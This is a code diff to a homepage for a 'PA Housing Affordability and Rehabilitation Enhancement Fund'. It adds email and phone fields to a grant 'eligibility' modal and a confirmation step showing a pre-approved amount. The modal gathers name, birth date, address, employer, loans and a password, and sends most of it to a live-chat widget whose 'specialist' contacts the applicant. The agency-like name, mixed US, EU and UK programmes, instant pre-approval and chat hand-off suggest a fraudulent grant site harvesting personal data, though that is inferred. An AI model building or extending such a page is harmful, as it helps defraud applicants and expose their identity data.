@@ -5,6 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Home | PA Housing Affordability and Rehabilitation Enhancement Fund</title>
 
+<!-- ============================ FAVICON ============================ -->
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/apple-touch-icon.png" />
+<link rel="icon" href="/assets/apple-touch-icon.png" />
+<link rel="manifest" href="/site.webmanifest" />
+<meta name="theme-color" content="#0a2540" />
+
 <link rel="stylesheet" href="css/pahf.css">
 
 <style>
@@ -221,11 +229,7 @@ img{max-width:100%;height:auto;display:block;}
 .btn[disabled]{opacity:.55;cursor:not-allowed;}
 .btn-arrow::after{content:'→';font-size:16px;margin-left:4px;}
 
-/* ============================================================
-   UNDP-INSPIRED EXTENDED SECTIONS
-   ============================================================ */
-
-/* ---------- Mission (two-column, label left / statement right) ---------- */
+/* ---------- Mission ---------- */
 .mission{
   display:grid;grid-template-columns:1fr 2fr;gap:36px;
   padding:48px 0;margin:36px 0;border-top:1px solid var(--border);border-bottom:1px solid var(--border);
@@ -294,16 +298,14 @@ img{max-width:100%;height:auto;display:block;}
 }
 .story:hover{box-shadow:var(--shadow-md);transform:translateY(-3px);border-color:#c8d3dc;text-decoration:none;}
 .story__media{
-  aspect-ratio:16/9;background:linear-gradient(135deg,#e8eff5 0%,#c8dcec 100%);
+  aspect-ratio:16/9;background:#eef2f6;
   position:relative;overflow:hidden;
 }
-.story__media img{width:100%;height:100%;object-fit:cover;}
-.story__media--ph::after{
-  content:'';position:absolute;inset:0;
-  background:
-    radial-gradient(circle at 30% 40%,rgba(11,79,122,.18) 0%,transparent 45%),
-    radial-gradient(circle at 70% 65%,rgba(124,179,66,.2) 0%,transparent 40%);
+.story__media img{
+  width:100%;height:100%;object-fit:cover;display:block;
+  transition:transform .4s ease;
 }
+.story:hover .story__media img{transform:scale(1.04);}
 .story__body{padding:18px 20px 20px;display:flex;flex-direction:column;flex:1;}
 .story__cat{
   font-size:10.5px;font-weight:700;letter-spacing:1.6px;text-transform:uppercase;
@@ -350,18 +352,11 @@ img{max-width:100%;height:auto;display:block;}
   text-decoration:none;color:inherit;display:flex;flex-direction:column;
 }
 .pub__cover{
-  aspect-ratio:3/4;background:linear-gradient(160deg,#0a2540 0%,#0b4f7a 100%);
+  aspect-ratio:3/4;background:#eef2f6;
   border-radius:6px;position:relative;overflow:hidden;margin-bottom:12px;
   border:1px solid #dbe4ec;
-  display:flex;align-items:center;justify-content:center;color:#fff;
 }
-.pub__cover--alt{background:linear-gradient(160deg,#0f3a24 0%,#14532d 100%);}
-.pub__cover--gold{background:linear-gradient(160deg,#7a5a00 0%,#c9a227 100%);}
-.pub__cover--orange{background:linear-gradient(160deg,#8c3100 0%,#d94f04 100%);}
-.pub__cover span{
-  font-family:Georgia,serif;font-size:32px;font-weight:700;letter-spacing:2px;
-  opacity:.7;
-}
+.pub__cover img{width:100%;height:100%;object-fit:cover;display:block;}
 .pub__cat{font-size:10.5px;font-weight:700;letter-spacing:1.6px;text-transform:uppercase;color:var(--green-dark);margin-bottom:4px;}
 .pub__title{font-size:14.5px;font-weight:700;color:var(--navy-dark);margin:0 0 4px;line-height:1.3;}
 .pub__desc{font-size:12.5px;color:var(--muted);margin:0;line-height:1.5;}
@@ -474,6 +469,8 @@ img{max-width:100%;height:auto;display:block;}
 .form-row input[type="date"],
 .form-row input[type="number"],
 .form-row input[type="password"],
+.form-row input[type="email"],
+.form-row input[type="tel"],
 .form-row select,
 .form-row textarea{
   width:100%;font-family:inherit;font-size:14.5px;color:var(--text);
@@ -512,8 +509,8 @@ img{max-width:100%;height:auto;display:block;}
   border-bottom:1px solid #eef2f6;
 }
 .result-breakdown div:last-child{border-bottom:0;}
-.result-breakdown dt{color:var(--muted);font-weight:500;}
-.result-breakdown dd{margin:0;color:var(--text);font-weight:700;text-align:right;}
+.result-breakdown dt{color:var(--muted);font-weight:500;flex-shrink:0;}
+.result-breakdown dd{margin:0;color:var(--text);font-weight:700;text-align:right;word-break:break-word;}
 .spinner{
   width:44px;height:44px;margin:20px auto 16px;
   border:4px solid #eef2f6;border-top-color:var(--navy);
@@ -521,6 +518,21 @@ img{max-width:100%;height:auto;display:block;}
 }
 @keyframes spin{to{transform:rotate(360deg);}}
 .processing-copy{text-align:center;color:var(--muted);font-size:14px;}
+
+/* ---------- Confirmation banner (step 5) ---------- */
+.confirm-banner{
+  background:linear-gradient(135deg,#0f3a24 0%,#14532d 100%);color:#fff;
+  border-radius:8px;padding:18px 22px;margin-bottom:22px;
+  display:flex;align-items:flex-start;gap:14px;
+}
+.confirm-banner__icon{
+  flex-shrink:0;width:26px;height:26px;border-radius:50%;
+  background:rgba(255,255,255,.15);color:#7cf0a5;
+  display:flex;align-items:center;justify-content:center;
+  font-size:15px;font-weight:700;line-height:1;
+}
+.confirm-banner h4{margin:0 0 4px;font-size:15.5px;font-weight:700;color:#fff;letter-spacing:-.1px;}
+.confirm-banner p{margin:0;font-size:13px;color:#c8e6d0;line-height:1.5;}
 
 .toast{
   position:fixed;right:24px;bottom:24px;z-index:1150;background:var(--navy-dark);color:#fff;
@@ -586,7 +598,7 @@ img{max-width:100%;height:auto;display:block;}
     <a href="funding.html">Programs</a>
     <a href="#eligibility">Eligibility</a>
     <a href="funding.html">Impact</a>
-    <a href="apply.html">Apply</a>
+    <a href="register.html">Apply</a>
     <a href="contact.html">Contact</a>
     <span class="navbar-pahf__flag hidden" id="navFlag" title="Switch region">
       <span id="navFlagIcon">🇺🇸</span>
@@ -781,7 +793,7 @@ img{max-width:100%;height:auto;display:block;}
     </div>
   </section>
 
-  <!-- ---------------- FEATURED STORIES ---------------- -->
+  <!-- ---------------- FEATURED STORIES (real images) ---------------- -->
   <section class="featured hidden" id="featuredSection">
     <div class="featured__head">
       <h2>Featured stories &amp; updates</h2>
@@ -790,7 +802,11 @@ img{max-width:100%;height:auto;display:block;}
     <div class="featured__grid">
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&w=800&q=80"
+               alt="A set of house keys resting on a light wooden table beside a small house-shaped keyring."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">Program update</p>
           <h3 class="story__title">2026 funding cycle opens with expanded eligibility</h3>
@@ -802,7 +818,11 @@ img{max-width:100%;height:auto;display:block;}
       </a>
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1568605114967-8130f3a36994?auto=format&fit=crop&w=800&q=80"
+               alt="A single-family suburban home with a gabled roof, front lawn, and driveway at dusk."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">Success story</p>
           <h3 class="story__title">From foreclosure risk to a stable mortgage</h3>
@@ -814,7 +834,11 @@ img{max-width:100%;height:auto;display:block;}
       </a>
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1467269204594-9661b134dd2b?auto=format&fit=crop&w=800&q=80"
+               alt="Narrow cobblestone street in a historic European city lined with pale stone buildings."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">Announcement</p>
           <h3 class="story__title">GEF SGP extends into four new EU member states</h3>
@@ -826,7 +850,11 @@ img{max-width:100%;height:auto;display:block;}
       </a>
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=800&q=80"
+               alt="Financial charts, a laptop and printed reports laid out on a wooden desk during analysis."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">Report</p>
           <h3 class="story__title">Annual outcomes report 2025</h3>
@@ -838,7 +866,11 @@ img{max-width:100%;height:auto;display:block;}
       </a>
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1513635269975-59663e0ac1ad?auto=format&fit=crop&w=800&q=80"
+               alt="Tower Bridge spanning the River Thames in London, lit at dusk with a warm orange sky."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">News</p>
           <h3 class="story__title">UK expansion: £2m ceiling now available</h3>
@@ -850,7 +882,11 @@ img{max-width:100%;height:auto;display:block;}
       </a>
 
       <a class="story" href="funding.html">
-        <div class="story__media story__media--ph"></div>
+        <div class="story__media">
+          <img src="https://images.unsplash.com/photo-1450101499163-c8848c66ca85?auto=format&fit=crop&w=800&q=80"
+               alt="A fountain pen resting on an open notebook of handwritten notes beside a cup of coffee."
+               loading="lazy">
+        </div>
         <div class="story__body">
           <p class="story__cat">Guidance</p>
           <h3 class="story__title">What documentation do I need to apply?</h3>
@@ -881,34 +917,50 @@ img{max-width:100%;height:auto;display:block;}
     </div>
   </section>
 
-  <!-- ---------------- PUBLICATIONS ---------------- -->
+  <!-- ---------------- PUBLICATIONS (real covers) ---------------- -->
   <section class="publications hidden" id="publicationsSection">
     <h2>Publications</h2>
     <div class="pub-grid">
 
       <a class="pub" href="funding.html">
-        <div class="pub__cover"><span>PHFA</span></div>
+        <div class="pub__cover">
+          <img src="https://images.unsplash.com/photo-1554224312-3d2e1c2ba7e8?auto=format&fit=crop&w=600&q=80"
+               alt="A tall stack of printed annual reports and bound documents on a light background."
+               loading="lazy">
+        </div>
         <p class="pub__cat">Report</p>
         <h3 class="pub__title">Annual Report 2025</h3>
         <p class="pub__desc">Every disbursement, every household, measured.</p>
       </a>
 
       <a class="pub" href="funding.html">
-        <div class="pub__cover pub__cover--alt"><span>SGP</span></div>
+        <div class="pub__cover">
+          <img src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?auto=format&fit=crop&w=600&q=80"
+               alt="A strategic planning meeting with printed charts, notes and coffee on a conference table."
+               loading="lazy">
+        </div>
         <p class="pub__cat">Report</p>
         <h3 class="pub__title">GEF Small Grants — Strategy 2026–2029</h3>
         <p class="pub__desc">Supporting homeowners across the European Union.</p>
       </a>
 
       <a class="pub" href="funding.html">
-        <div class="pub__cover pub__cover--gold"><span>£€$</span></div>
+        <div class="pub__cover">
+          <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?auto=format&fit=crop&w=600&q=80"
+               alt="An open lined notebook with a pen resting on it, ready for handwritten notes."
+               loading="lazy">
+        </div>
         <p class="pub__cat">Guide</p>
         <h3 class="pub__title">Applicant Handbook</h3>
         <p class="pub__desc">Everything a recent homebuyer needs to apply.</p>
       </a>
 
       <a class="pub" href="funding.html">
-        <div class="pub__cover pub__cover--orange"><span>2026</span></div>
+        <div class="pub__cover">
+          <img src="https://images.unsplash.com/photo-1481627834876-b7833e8f5570?auto=format&fit=crop&w=600&q=80"
+               alt="A public register of bound books arranged vertically on a shelf."
+               loading="lazy">
+        </div>
         <p class="pub__cat">Register</p>
         <h3 class="pub__title">2026 Funding Register</h3>
         <p class="pub__desc">Public list of awarded applications, redacted for privacy.</p>
@@ -946,7 +998,7 @@ img{max-width:100%;height:auto;display:block;}
           <a href="funding.html#us">United States</a>
           <a href="funding.html#eu">European Union</a>
           <a href="funding.html#uk">United Kingdom</a>
-          <a href="apply.html">Apply now</a>
+          <a href="register.html">Apply now</a>
         </div>
 
         <div class="site-footer__col">
@@ -1018,8 +1070,10 @@ img{max-width:100%;height:auto;display:block;}
         <div class="step-dot" data-step="2"><div class="step-dot__circle">2</div><div class="step-dot__label">Your situation</div></div>
         <div class="step-dot" data-step="3"><div class="step-dot__circle">3</div><div class="step-dot__label">Your amount</div></div>
         <div class="step-dot" data-step="4"><div class="step-dot__circle">4</div><div class="step-dot__label">Create password</div></div>
+        <div class="step-dot" data-step="5"><div class="step-dot__circle">5</div><div class="step-dot__label">Confirmed</div></div>
       </div>
 
+      <!-- STEP 1 — now with Email + Phone -->
       <div class="step" id="step1">
         <div class="form-row">
           <label for="fName">Full name</label>
@@ -1033,12 +1087,23 @@ img{max-width:100%;height:auto;display:block;}
           <div class="hint">Applicants must be above 30 years of age.</div>
         </div>
         <div class="form-row">
+          <label for="fEmail">Email address</label>
+          <input type="email" id="fEmail" placeholder="you@example.com" autocomplete="email">
+          <div class="field-error">Please enter a valid email address.</div>
+        </div>
+        <div class="form-row">
+          <label for="fPhone">Phone number</label>
+          <input type="tel" id="fPhone" placeholder="(555) 000-0000" autocomplete="tel">
+          <div class="field-error">Please enter a valid phone number.</div>
+        </div>
+        <div class="form-row">
           <label for="fAddress">Street address</label>
           <input type="text" id="fAddress" placeholder="House number and street" autocomplete="street-address">
           <div class="field-error">Please enter your street address.</div>
         </div>
       </div>
 
+      <!-- STEP 2 -->
       <div class="step hidden" id="step2">
         <div class="form-row">
           <label>Do you own a home?</label>
@@ -1077,11 +1142,13 @@ img{max-width:100%;height:auto;display:block;}
         </div>
       </div>
 
+      <!-- STEP 3 : PROCESSING -->
       <div class="step hidden" id="step3-processing">
         <div class="spinner"></div>
         <p class="processing-copy" id="processingCopy">Assessing your eligibility against the programme criteria…</p>
       </div>
 
+      <!-- STEP 3 : RESULT -->
       <div class="step hidden" id="step3-result">
         <div class="result-panel">
           <p class="result-panel__eyebrow" id="resultEyebrow">Indicative funding amount</p>
@@ -1100,24 +1167,60 @@ img{max-width:100%;height:auto;display:block;}
         </div>
       </div>
 
+      <!-- STEP 4 : PASSWORD -->
       <div class="step hidden" id="step4">
-        <p class="result-panel__eyebrow" style="text-align:left;margin-bottom:6px;">Create your account password</p>
+        <p class="result-panel__eyebrow" style="text-align:left;margin-bottom:6px;">
+          Create your account password
+        </p>
         <p style="font-size:13.5px;color:var(--muted);margin:0 0 18px;max-width:52ch;">
           Your eligibility summary has been forwarded to our grant support team — a specialist
           will greet you in chat. In the meantime, secure your account.
         </p>
+
         <div class="form-row">
           <label for="fPassword">Password</label>
           <input type="password" id="fPassword" placeholder="At least 8 characters" autocomplete="new-password">
           <div class="field-error">Password must be at least 8 characters.</div>
         </div>
+
         <div class="form-row">
           <label for="fPassword2">Confirm password</label>
           <input type="password" id="fPassword2" placeholder="Re-enter your password" autocomplete="new-password">
           <div class="field-error">Passwords do not match.</div>
         </div>
+
         <div class="form-row" style="margin-top:22px;">
-          <button type="button" class="btn btn-primary btn-block" id="createAccountBtn">Create my account →</button>
+          <button type="button" class="btn btn-primary btn-block" id="createAccountBtn">
+            Confirm my application →
+          </button>
+        </div>
+      </div>
+
+      <!-- STEP 5 : CONFIRMATION (no redirect) -->
+      <div class="step hidden" id="step5">
+        <div class="confirm-banner">
+          <span class="confirm-banner__icon">✓</span>
+          <div>
+            <h4>Your account has been created</h4>
+            <p>
+              Your application has been submitted to our grant administrators for review.
+              You will be contacted at the email and phone number you provided.
+            </p>
+          </div>
+        </div>
+
+        <p class="result-panel__eyebrow" style="text-align:left;margin-top:4px;">Your pre-approved amount</p>
+        <p class="result-amount" id="finalAmount" style="text-align:left;margin:0 0 4px;">$0</p>
+        <p style="font-size:13px;color:var(--muted);margin:0 0 20px;">
+          This indicative amount is held for your application and confirmed on final verification.
+        </p>
+
+        <p class="result-panel__eyebrow" style="text-align:left;">Sign-up information on file</p>
+        <dl class="result-breakdown" id="finalBreakdown" style="max-width:none;margin:0;"></dl>
+
+        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:20px;">
+          <a class="btn btn-navy" href="register.html">Complete registration →</a>
+          <button type="button" class="btn btn-outline" id="closeConfirmBtn">Close</button>
         </div>
       </div>
 
@@ -1214,14 +1317,14 @@ s0.parentNode.insertBefore(s1,s0);
   const state = {
     region:null, step:1,
     form:{
-      name:'', dob:'', address:'',
+      name:'', dob:'', email:'', phone:'', address:'',
       ownsHome:null, yearPurchased:'',
       employed:null, employer:'',
       loans:'', amount:0, password:''
     }
   };
 
-  const STORAGE = { region:'phfa.region', cookies:'phfa.cookies' };
+  const STORAGE = { region:'phfa.region', cookies:'phfa.cookies', intake:'phfa.intake' };
 
   /* ---------- CURRENCY ---------- */
   function formatMoney(amount, regionKey) {
@@ -1421,6 +1524,12 @@ s0.parentNode.insertBefore(s1,s0);
       backBtn.classList.add('hidden');
       footSpacer.style.flex = '1';
     }
+    if (state.step === 5) {
+      $('step5').classList.remove('hidden');
+      nextBtn.classList.add('hidden');
+      backBtn.classList.add('hidden');
+      footSpacer.style.flex = '1';
+    }
   }
 
   function markError(input, on) {
@@ -1428,12 +1537,23 @@ s0.parentNode.insertBefore(s1,s0);
     if (row) row.classList.toggle('is-error', !!on);
   }
 
+  function validEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim()); }
+  function validPhone(v) { return String(v).replace(/\D/g, '').length >= 7; }
+
   function validateStep1() {
     let ok = true;
-    const name = $('fName'), dob = $('fDob'), addr = $('fAddress');
-    if (!name.value.trim()) { markError(name, true); ok = false; } else markError(name, false);
-    if (!dob.value)         { markError(dob, true);  ok = false; } else markError(dob, false);
-    if (!addr.value.trim()) { markError(addr, true); ok = false; } else markError(addr, false);
+    const name  = $('fName');
+    const dob   = $('fDob');
+    const email = $('fEmail');
+    const phone = $('fPhone');
+    const addr  = $('fAddress');
+
+    if (!name.value.trim())       { markError(name, true);  ok = false; } else markError(name, false);
+    if (!dob.value)               { markError(dob, true);   ok = false; } else markError(dob, false);
+    if (!validEmail(email.value)) { markError(email, true); ok = false; } else markError(email, false);
+    if (!validPhone(phone.value)) { markError(phone, true); ok = false; } else markError(phone, false);
+    if (!addr.value.trim())       { markError(addr, true);  ok = false; } else markError(addr, false);
+
     if (ok) {
       const d = new Date(dob.value), today = new Date();
       let age = today.getFullYear() - d.getFullYear();
@@ -1447,8 +1567,10 @@ s0.parentNode.insertBefore(s1,s0);
       }
     }
     if (ok) {
-      state.form.name = name.value.trim();
-      state.form.dob = dob.value;
+      state.form.name    = name.value.trim();
+      state.form.dob     = dob.value;
+      state.form.email   = email.value.trim();
+      state.form.phone   = phone.value.trim();
       state.form.address = addr.value.trim();
     }
     return ok;
@@ -1485,11 +1607,11 @@ s0.parentNode.insertBefore(s1,s0);
     } else markError(loansInput, false);
 
     if (ok) {
-      state.form.ownsHome = homePicked.value === 'yes';
+      state.form.ownsHome      = homePicked.value === 'yes';
       state.form.yearPurchased = state.form.ownsHome ? yearInput.value : '';
-      state.form.employed = empPicked.value === 'yes';
-      state.form.employer = state.form.employed ? empInput.value.trim() : '';
-      state.form.loans = Number(loansInput.value);
+      state.form.employed      = empPicked.value === 'yes';
+      state.form.employer      = state.form.employed ? empInput.value.trim() : '';
+      state.form.loans         = Number(loansInput.value);
     }
     return ok;
   }
@@ -1516,7 +1638,7 @@ s0.parentNode.insertBefore(s1,s0);
     }
   });
   backBtn.addEventListener('click', () => {
-    if (state.step > 1) { state.step -= 1; renderStep(); }
+    if (state.step > 1 && state.step !== 5) { state.step -= 1; renderStep(); }
   });
 
   let eligibilityRan = false;
@@ -1564,6 +1686,8 @@ s0.parentNode.insertBefore(s1,s0);
     const summary = {
       name: state.form.name,
       dob: state.form.dob,
+      email: state.form.email,
+      phone: state.form.phone,
       address: state.form.address,
       region: REGIONS[state.region].label,
       ownsHome: state.form.ownsHome ? 'Yes' : 'No',
@@ -1580,6 +1704,8 @@ s0.parentNode.insertBefore(s1,s0);
           Tawk_API.setAttributes({
             'Name': summary.name,
             'Date of Birth': summary.dob,
+            'Email': summary.email,
+            'Phone': summary.phone,
             'Address': summary.address,
             'Region': summary.region,
             'Homeowner': summary.ownsHome,
@@ -1601,6 +1727,7 @@ s0.parentNode.insertBefore(s1,s0);
     toast('Eligibility summary sent to grant support');
   }
 
+  /* ---------- CREATE ACCOUNT → CONFIRMATION (no redirect) ---------- */
   $('createAccountBtn').addEventListener('click', () => {
     const p1 = $('fPassword'), p2 = $('fPassword2');
     let ok = true;
@@ -1609,41 +1736,75 @@ s0.parentNode.insertBefore(s1,s0);
     if (!ok) return;
 
     state.form.password = p1.value;
+
+    /* Persist intake record for admin-side review */
     try {
       const record = {
         ts: Date.now(), region: state.region,
-        name: state.form.name, dob: state.form.dob, address: state.form.address,
+        name: state.form.name, dob: state.form.dob,
+        email: state.form.email, phone: state.form.phone,
+        address: state.form.address,
         ownsHome: state.form.ownsHome, year: state.form.yearPurchased,
         employed: state.form.employed, employer: state.form.employer,
         loans: state.form.loans, amount: state.form.amount,
         currency: REGIONS[state.region].currency.code
       };
-      const prev = JSON.parse(localStorage.getItem('phfa.intake') || '[]');
+      const prev = JSON.parse(localStorage.getItem(STORAGE.intake) || '[]');
       prev.push(record);
-      localStorage.setItem('phfa.intake', JSON.stringify(prev));
+      localStorage.setItem(STORAGE.intake, JSON.stringify(prev));
     } catch (_) {}
 
     if (window.Tawk_API && typeof Tawk_API.addEvent === 'function') {
       try {
         Tawk_API.addEvent('account_created', {
           region: REGIONS[state.region].label,
-          amount: formatMoney(state.form.amount, state.region)
+          amount: formatMoney(state.form.amount, state.region),
+          email: state.form.email,
+          phone: state.form.phone
         }, function () {});
       } catch (_) {}
     }
-    toast('Account created — our team will be in touch');
-    setTimeout(() => { closeModal(); window.location.href = 'apply.html'; }, 900);
+
+    /* Build the inline confirmation panel */
+    $('finalAmount').textContent = formatMoney(state.form.amount, state.region);
+
+    const regionLabels = { US:'United States', EU:'European Union', UK:'United Kingdom' };
+    const rows = [
+      ['Full name',        state.form.name],
+      ['Email address',    state.form.email],
+      ['Phone number',     state.form.phone],
+      ['Street address',   state.form.address],
+      ['Date of birth',    state.form.dob],
+      ['Region',           regionLabels[state.region] || state.region],
+      ['Homeowner',        state.form.ownsHome
+                             ? ('Yes · purchased ' + (state.form.yearPurchased || '—'))
+                             : 'No'],
+      ['Employment',       state.form.employed
+                             ? ('Yes · ' + (state.form.employer || '—'))
+                             : 'No'],
+      ['Unpaid loans',     String(state.form.loans)],
+      ['Pre-approved amount', formatMoney(state.form.amount, state.region)]
+    ];
+    $('finalBreakdown').innerHTML = rows
+      .map(([k, v]) => `<div><dt>${esc(k)}</dt><dd>${esc(v)}</dd></div>`)
+      .join('');
+
+    toast('Account created — application sent to admin for review');
+    state.step = 5;
+    renderStep();
   });
+
+  $('closeConfirmBtn').addEventListener('click', closeModal);
 
   function resetForm() {
     eligibilityRan = false;
     state.form = {
-      name:'', dob:'', address:'',
+      name:'', dob:'', email:'', phone:'', address:'',
       ownsHome:null, yearPurchased:'',
       employed:null, employer:'',
       loans:'', amount:0, password:''
     };
-    ['fName','fDob','fAddress','fYear','fEmployer','fLoans','fPassword','fPassword2']
+    ['fName','fDob','fEmail','fPhone','fAddress','fYear','fEmployer','fLoans','fPassword','fPassword2']
       .forEach((id) => { const el = $(id); if (el) el.value = ''; });
     qsa('input[type="radio"]', modal).forEach((r) => { r.checked = false; });
     qsa('.form-row', modal).forEach((row) => row.classList.remove('is-error'));
@@ -1652,6 +1813,7 @@ s0.parentNode.insertBefore(s1,s0);
     $('step3-result').classList.add('hidden');
     $('step3-processing').classList.add('hidden');
     $('step4').classList.add('hidden');
+    $('step5').classList.add('hidden');
     $('step1').classList.add('hidden');
     $('step2').classList.add('hidden');
   }
